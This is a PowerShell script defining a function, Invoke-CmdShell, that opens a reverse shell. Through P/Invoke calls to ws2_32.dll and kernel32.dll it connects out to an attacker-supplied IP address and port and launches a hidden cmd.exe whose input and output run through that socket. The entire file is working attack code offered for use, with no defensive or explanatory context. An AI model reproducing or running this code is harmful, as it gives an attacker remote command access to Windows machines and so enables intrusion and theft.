function Invoke-CmdShell {
<#
usage:Invoke-CmdShell -c 192.168.1.100 -p 8080
#>
    param (
        [Parameter(Mandatory = $True)]
		[string]$c,
        [Parameter(Mandatory = $True)]
		[int]$p
	)

    # Define all the structures for CreateProcess
	Add-Type -TypeDefinition @"
	using System;
    using System.Net;
    using System.Net.Sockets;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	
	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
	}
	
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle;
		public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars;
		public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow;
		public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput;
		public IntPtr hStdError;
	}

    [StructLayout(LayoutKind.Sequential)]
    public struct WSAData
    {
        public Int16 wVestion;
        public Int16 wHighVersion;
        [MarshalAs(UnmanagedType.ByValTStr,SizeConst = 257)]
        public string szDescription;
        [MarshalAs(UnmanagedType.ByValTStr,SizeConst = 129)]
        public string szSystemStatus;
        public Int16 iMaxSockets;
        public Int16 iMaxUdpDg;
        public IntPtr lpVendorInfo;
    }
	
    [StructLayout(LayoutKind.Sequential)]
	public struct sockaddr_in
	{
		public Int16 sin_family;
		public Int16 sin_port;
		public byte s1;
		public byte s2;
		public byte s3;
		public byte s4;
		public long sin_zero;
	}

    public static class Ws2_32
    {
        [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError=true)]
		public static extern int WSAStartup(
			short wVersionRequested,
			ref WSAData lpWSAData
		);

        [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr WSASocket(
            [In] AddressFamily addressFamily,
            [In] SocketType socketType,
            [In] ProtocolType protocolType,
            [In] IntPtr protocolInfo,
            [In] uint group,
            [In] int flags
            );

        [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError=true)]
		public static extern int WSAConnect(
			IntPtr s,
			ref sockaddr_in name,
			int namelen,
			int lpCallerData,
			int lpCalleeData,
			int lpSQOS,
			int lpGQOS
		);

        [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError=true)]
		public static extern short htons(
			short hostshort
		);
     }

	public static class Kernel32
	{
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool CreateProcess(
			string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, 
			IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, 
			IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, 
			out PROCESS_INFORMATION lpProcessInformation);
	}
"@
    Trap {"Trap Error: $($_.Exception.Message)"; Continue}
    #wsa socket
    $wsa = New-Object WSAData
    [Ws2_32]::WSAStartup(0x0202, [ref]$wsa) | Out-Null

    #WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
    $sock = [ws2_32]::WSASocket(2,1,6,0,0,0) 

    $remoteaddr=$c.Split(".")
    # sockaddr_in Struct
	$sockaddr = New-Object sockaddr_in
	$sockaddr.s1 = $remoteaddr[0]
	$sockaddr.s2 = $remoteaddr[1]
	$sockaddr.s3 = $remoteaddr[2]
	$sockaddr.s4 = $remoteaddr[3]
	$sockaddr.sin_family = 2
	$sockaddr.sin_port = [ws2_32]::htons($p)

    #WSAConnect connect to socket on specified IP and Port
	$size = [System.Runtime.InteropServices.Marshal]::SizeOf($sockaddr)
	if ([ws2_32]::WSAConnect($sock,[Ref]$sockaddr,$size,0,0,0,0) -eq -1) {return "Connect error!"}

	# StartupInfo Struct
	$StartupInfo = New-Object STARTUPINFO
	$StartupInfo.dwFlags = 0x101 # StartupInfo.dwFlag
	$StartupInfo.wShowWindow = 0 # StartupInfo.ShowWindow
    $StartupInfo.hStdInput = $StartupInfo.hStdOutput = $StartupInfo.hStdError = $sock
	$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size
	
	# ProcessInfo Struct
	$ProcessInfo = New-Object PROCESS_INFORMATION
	
	$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
	
	# Call CreateProcess
    $Binary = "C:\Windows\System32\cmd.exe"
	[Kernel32]::CreateProcess( $Binary,$null, [IntPtr]::Zero, [IntPtr]::Zero, $true, 0x08000000, [IntPtr]::Zero, $GetCurrentPath, [ref] $StartupInfo, [ref] $ProcessInfo) |out-null
	
	echo "`nProcess Information:"
	Get-Process -Id $ProcessInfo.dwProcessId |fl
}
